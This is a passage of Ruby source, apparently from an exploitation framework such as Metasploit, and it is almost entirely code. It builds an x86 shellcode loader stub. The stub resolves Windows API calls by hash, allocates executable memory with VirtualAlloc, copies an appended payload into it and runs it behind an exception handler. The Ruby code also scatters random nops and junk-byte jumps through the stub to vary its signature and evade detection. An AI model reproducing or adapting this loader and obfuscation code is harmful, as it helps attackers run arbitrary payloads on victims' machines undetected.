		  mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
		goodbye:                 ; We now perform the actual call to the exit function
		  push byte 0            ; push the exit function parameter
		  push ebx               ; push the hash of the exit function
		  call ebp               ; call EXITFUNK( 0 );
		^

		stub_alloc = %Q^
		  cld                    ; Clear the direction flag.
		  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
		delta:                   ;
		#{stub_block}
		start:                   ;
		  pop ebp                ; Pop off the address of 'api_call' for calling later.

		allocate_size:
		   mov esi,PAYLOAD_SIZE

		allocate:
		  push byte 0x40         ; PAGE_EXECUTE_READWRITE
		  push 0x1000            ; MEM_COMMIT
		  push esi               ; Push the length value of the wrapped code block
		  push byte 0            ; NULL as we dont care where the allocation is.
		  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
		  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

		  mov ebx, eax           ; Store allocated address in ebx
		  mov edi, eax           ; Prepare EDI with the new address
		  mov ecx, esi           ; Prepare ECX with the length of the code
		  call get_payload
		got_payload:
		  pop esi                ; Prepare ESI with the source to copy
		  rep movsb              ; Copy the payload to RWX memory
		  call set_handler       ; Configure error handling

		exitblock:
		#{stub_exit}
		set_handler:
		  xor eax,eax
		  push dword [fs:eax]
		  mov dword [fs:eax], esp
		  call ebx
		  jmp short exitblock
		^

		stub_final = %Q^
		get_payload:
		  call got_payload
		payload:
		; Append an arbitary payload here
		^


		stub_alloc.gsub!('short', '')
		stub_alloc.gsub!('byte', '')

		wrapper = ""
		# regs    = %W{eax ebx ecx edx esi edi ebp}

		cnt_jmp = 0
		cnt_nop = 64

		stub_alloc.each_line do |line|
			line.gsub!(/;.*/, '')
			line.strip!
			next if line.empty?

			if (cnt_nop > 0 and rand(4) == 0)
				wrapper << "nop\n"
				cnt_nop -= 1
			end

			if(cnt_nop > 0 and rand(16) == 0)
				cnt_nop -= 2
				cnt_jmp += 1

				wrapper << "jmp autojump#{cnt_jmp}\n"
				1.upto(rand(8)+1) do
					wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
					cnt_nop -= 1
				end
				wrapper << "autojump#{cnt_jmp}:\n"
			end
			wrapper << line + "\n"
		end

		wrapper << stub_final

		enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
		off = enc.offset_of_reloc('PAYLOAD_SIZE')
		res = enc.data + code

		res[off,4] = [code.length].pack('V')
		res
	end

end
end
end

